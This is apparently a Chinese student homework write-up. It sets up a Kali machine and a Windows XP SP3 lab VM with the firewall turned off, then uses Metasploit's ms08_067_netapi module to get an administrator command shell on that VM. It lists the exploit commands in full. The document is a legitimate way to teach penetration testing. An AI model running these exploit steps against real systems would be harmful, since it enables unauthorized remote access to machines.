# 239-16 Metasploit进行漏洞测试

![title2](/course/softwareSecurtyHomework/title2.png)

## Kali 安装

安装成功后的界面：![bb575de0908a73e5bf9007376bc82b51](/course/softwareSecurtyHomework/bb575de0908a73e5bf9007376bc82b51.png)

## 安装并配置Windows

Windows选用了 Windows XP Professional With SP3 x32（简体中文） ，采用VMWare安装。

下载地址：

https://pan.baidu.com/s/17J_tWrQcnAU-QGG_uWdcIw?pwd=zt88

然后手动关闭防火墙

## 使用Metasploit进行漏洞测试

在kali中用root启动终端，初始化并启动Metasploit：

 ```shell
   #启动并显示PostgreSQL服务
   service postgresql start
   service postgresql status
   #初始化Metasploit框架的数据库msfdb
   msfdb init
   #启动Metasploit框架的控制台界面
   msfconsole
   #在Metasploit控制台界面中执行，用于显示数据库的状态
   msf6 > db_status
 ```

   ![image11](/course/softwareSecurtyHomework/image11.png)

### 获得两机ip地址

kali 虚拟机 ip地址:172.27.94.165

![image-20251222121250295](/course/softwareSecurtyHomework/api-examples.md)

windows xp的ip地址：172.27.83.190

![image-20251222121400238](/course/softwareSecurtyHomework/image-20251222121400238.png)

把网络都设为bridge模式，这样才能相互ping通

### 渗透测试

现在可以开始渗透测试了。在kali中root模式 命令如下

```bash
use windows/smb/ms08_067_netapi
set RHOST 172.27.83.190   # 靶机IP
set LHOST 172.27.94.165  # Kali所在机IP
show targets #查看支持的操作系统 得到目标操作系统为34  Windows XP SP3 Chinese - Simplified (NX)
set Target 34 
exploit #开始渗透
```

![image-20251221135329300](/course/softwareSecurtyHomework/image-20251221135329300.png)

至此，我们拿到了目标Windows XP虚拟机的管理员CMD权限，渗透完成

### 探索

可以查看靶机上的进程信息：

![image](/course/softwareSecurtyHomework/image.png)